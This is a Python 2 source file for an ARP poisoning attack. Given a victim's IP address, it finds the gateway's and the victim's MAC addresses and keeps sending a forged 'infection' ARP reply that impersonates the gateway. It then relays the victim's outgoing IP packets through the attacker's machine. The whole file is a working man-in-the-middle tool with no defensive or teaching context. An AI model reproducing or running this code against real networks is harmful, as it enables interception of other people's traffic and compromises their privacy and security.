import netifaces
import time
import pcap
import sys
import threading

from packets import *

my_mac = None
victim_ip = None
victim_mac = None
gateway_ip = None
gateway_mac = None


def send_periodically(infection_reply, interval_in_second=20):
    pcap_handle = pcap.pcap(timeout_ms=0)
    while True:
        pcap_handle.sendpacket(infection_reply.as_bytes())
        print '[<+] Periodical packet sent'
        time.sleep(interval_in_second)


def reply_to_request(infection_reply):
    pcap_handle = pcap.pcap(timeout_ms=0)
    while True:
        for capture in pcap_handle:
            if capture is None:
                continue
            time_stamp, packet = capture
            arp = ARP(packet)
            if arp.operation == ARP.OP_REQUEST \
                    and arp.sender_protocol_address == victim_ip \
                    and arp.sender_hardware_address == victim_mac \
                    and arp.target_protocol_address == gateway_ip:
                print "[>+] Received victim's request for ip '{}'".format(gateway_ip)

                pcap_handle.sendpacket(infection_reply.as_bytes())
                print '[<+] Sent victim attack packet'

        print 'relaying ip stopped unexpectedly. restarting.'
        pcap_handle = pcap.pcap(timeout_ms=0)


def relay_ip():
    pcap_handle = pcap.pcap(timeout_ms=0)
    pcap_handle.setfilter('ip src host {} and dst host {}'.format(victim_ip.in_string, gateway_ip.in_string))
    while True:
        for capture in pcap_handle:
            if capture is None:
                continue
            time_stamp, packet = capture
            print "[>!]got victim's ip packet to gateway."
            relaying_packet = Ethernet(packet)
            relaying_packet.source_mac = my_mac
            relaying_packet.destination_mac = gateway_mac
            pcap_handle.sendpacket(relaying_packet.as_bytes())
            print '[<!]sent relay.'

        print 'relaying ip stopped unexpectedly. restarting.'
        pcap_handle = pcap.pcap(timeout_ms=0)


def main():
    global my_mac, victim_ip, victim_mac, gateway_ip, gateway_mac
    if len(sys.argv) not in (2, 3):
        print 'Usage: python arp_poison.py victim_ip [interface_name]'
        exit(1)

    gateways = netifaces.gateways()
    interface_name = pcap.lookupdev()
    addresses = netifaces.ifaddresses(interface_name)

    my_mac = MacAddress(addresses[netifaces.AF_LINK][0]['addr'])
    my_ip = IPv4Address(addresses[netifaces.AF_INET][0]['addr'])
    if len(sys.argv) == 2:
        try:
            gateway_ip = IPv4Address(gateways[netifaces.AF_INET][0][0])
        except KeyError:
            print 'No internet gateway detected.'
            exit(1)
    else:
        for address, interface, is_default in gateways[netifaces.AF_INET]:
            if interface == sys.argv[2]:
                gateway_ip = address
                break
        else:
            print 'There is no interface named {}'.format(sys.argv[2])
            exit(1)
    victim_ip = IPv4Address(sys.argv[1])
    print

    print 'my      mac: {}'.format(my_mac.in_string)
    print 'my      ip : {}'.format(my_ip.in_string)
    print 'gateway ip : {}'.format(gateway_ip.in_string)
    print 'victim  ip : {}'.format(victim_ip.in_string)

    pcap_handle = pcap.pcap(timeout_ms=0)
    pcap_handle.setfilter('arp')
    # ask gateway its mac address
    asking_arp = normal_request_arp(my_mac, my_ip, gateway_ip)
    pcap_handle.sendpacket(asking_arp.as_bytes())
    print '[<+] Sent gateway({}) an ARP request'.format(gateway_ip.in_string)
    for capture in pcap_handle:
        if capture is None:
            continue
        time_stamp, packet = capture
        arp = ARP(packet)
        if arp.operation == ARP.OP_REPLY and arp.sender_protocol_address == gateway_ip:
            gateway_mac = arp.sender_hardware_address
            print "[>+] gateway replied its mac is '{}'".format(gateway_mac.in_string)
            break
    else:
        raise RuntimeError('Packet capture ended unexpectedly.')

    # ask victim his mac address
    asking_arp = normal_request_arp(my_mac, my_ip, victim_ip)
    pcap_handle.sendpacket(asking_arp.as_bytes())
    print '[<+] Sent victim({}) an ARP request'.format(victim_ip.in_string)

    # wait for victim's response
    for capture in pcap_handle:
        if capture is None:
            continue
        time_stamp, packet = capture
        arp = ARP(packet)
        if arp.operation == ARP.OP_REPLY and arp.sender_protocol_address == victim_ip:
            victim_mac = arp.sender_hardware_address
            print "[>+] victim replied his mac is '{}'".format(victim_mac.in_string)
            break
    else:
        raise RuntimeError('Packet capture ended unexpectedly.')

    # attack packet
    infection_arp = normal_reply_arp(my_mac, gateway_ip, victim_mac, victim_ip)

    replier = threading.Thread(target=reply_to_request, args=(infection_arp,))
    periodical = threading.Thread(target=send_periodically, args=(infection_arp,))
    replier.start()
    periodical.start()
    relay_ip()


if __name__ == '__main__':
    main()
